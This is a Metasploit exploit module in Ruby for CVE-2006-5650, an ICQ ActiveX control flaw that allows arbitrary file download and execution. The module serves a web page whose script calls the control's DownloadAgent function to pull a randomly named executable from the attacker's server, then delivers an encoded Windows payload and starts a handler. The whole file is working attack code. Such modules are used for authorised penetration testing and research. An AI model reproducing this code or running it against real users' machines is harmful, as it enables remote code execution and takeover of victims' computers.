##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote

	include Msf::Exploit::Remote::HttpServer::HTML

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'America Online ICQ ActiveX Control Arbitrary File Download and Execute.',
			'Description'    => %q{
				This module allows remote attackers to download and execute arbitrary files
				on a users system via the DownloadAgent function of the ICQPhone.SipxPhoneManager ActiveX control. 
			},
			'License'        => 'MSF_LICENSE',
			'Author'         => [ 'MC' ],
			'Version'        => '$Revision:$',
			'References'     => 
				[
					[ 'CVE', '2006-5650' ],
					[ 'BID', '20930' ],
					[ 'URL', 'http://www.zerodayinitiative.com/advisories/ZDI-06-037/' ],
				],
			'Payload'        =>
				{
					'Space'           => 2048,
					'StackAdjustment' => -3500,
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
	  				[ 'Automatic', { } ],
				],
			'DisclosureDate' => 'Nov 6, 2006',
			'DefaultTarget'  => 0))

			register_options(
				[
					OptString.new('URIPATH', [ true, "The URI to use.", "/" ])
				], self.class)

	end

	def autofilter
		false
	end

	def check_dependencies
		use_zlib
	end

	def on_request_uri(cli, request)

		payload_url =  "http://"
		payload_url += (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address(cli.peerhost) : datastore['SRVHOST']
		payload_url += ":" + datastore['SRVPORT'] + get_resource() + "/PAYLOAD"

		if (request.uri.match(/PAYLOAD/))
			return if ((p = regenerate_payload(cli)) == nil)
			data = Rex::Text.to_win32pe(p.encoded, '') 
			print_status("Sending EXE payload to #{cli.peerhost}:#{cli.peerport}...")
			send_response(cli, data, { 'Content-Type' => 'application/octet-stream' })
			return
		end

		vname  = rand_text_alpha(rand(100) + 1)
		exe    = rand_text_alpha_upper(rand(5) + 1)

		content = %Q|
	<html>
		<head>
			<script>
				try {
					var #{vname} = new ActiveXObject('ICQPhone.SipxPhoneManager.1');
					#{vname}.DownloadAgent("#{payload_url}/#{exe}.exe");
				} catch( e ) { window.location = 'about:blank' ; }
			</script>
		</head>
	</html>
				|

		print_status("Sending #{self.name} to #{cli.peerhost}:#{cli.peerport}...")

		send_response_html(cli, content)
	
		handler(cli)
		
	end
end
